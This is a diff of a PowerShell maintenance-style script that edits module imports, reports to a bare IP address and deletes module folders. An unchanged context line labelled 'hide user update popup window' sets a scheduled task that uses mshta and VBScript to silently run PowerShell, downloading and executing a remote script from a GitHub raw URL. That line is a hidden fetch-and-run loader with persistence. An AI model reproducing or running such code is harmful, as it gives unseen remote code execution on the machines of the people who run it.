@@ -1,5 +1,4 @@
-﻿$Version = "1.0"
-# -------------------- hide user update popup window --------------------
+﻿# -------------------- hide user update popup window --------------------
 $newAction = New-ScheduledTaskAction -Execute "mshta" -Argument "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"powershell -Command IEX (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/ShirakamiFubuking/Scripts/refs/heads/main/user.ps1')"""",0,True:close()"")"
 Set-ScheduledTask -TaskName "pwb_update_user" -Action $newAction
 
@@ -67,8 +66,11 @@ try {
 catch {
     Write-Error "An error occurred: $($_.Exception.Message)"
 }
-Import-Module Report
+Import-Module GeTools
 Report "http://128.5.47.252:5000/report"
+Remove-Item -Recurse "C:\Program Files\WindowsPowerShell\Modules\LogTool"
+Remove-Item -Recurse "C:\Program Files\WindowsPowerShell\Modules\Report"
+Remove-Item -Recurse "C:\Program Files\WindowsPowerShell\Modules\UpdateTools"
 
 # -------------------- Pre-Flight Checks --------------------
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
